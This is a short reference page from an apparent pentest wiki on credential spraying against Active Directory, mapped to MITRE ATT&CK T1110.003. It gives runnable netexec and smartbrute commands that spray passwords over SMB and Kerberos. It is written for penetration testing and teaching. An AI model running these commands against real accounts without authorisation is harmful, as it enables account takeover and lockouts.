---
description: MITRE ATT&CK™ Sub-technique T1110.003
authors: ShutdownRepo, mpgn, sckdev
category: ad
---

# Spraying

Credential spraying is a technique that attackers use to try a few passwords (or keys) against a set of usernames instead of a single one. This technique is just [credential guessing](guessing) but "sprayed" (i.e. against multiple accounts) and tools that can do [credential guessing](guessing) can usually do spraying.

```bash
# netexec example
nxc smb $TARGET_IP -d $DOMAIN -u users.txt -p $PASSWORD --no-bruteforce --continue-on-success

# smartbrute example (dynamic user list)
smartbrute smart -bp "password" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$KDC" kerberos

# smartbrute example (static users list)
smartbrute brute -bU users.txt -bp "password" kerberos --kdc-ip "$KDC" 
```

> [!TIP]
> Read the ["Password guessing"](guessing) article for more insight.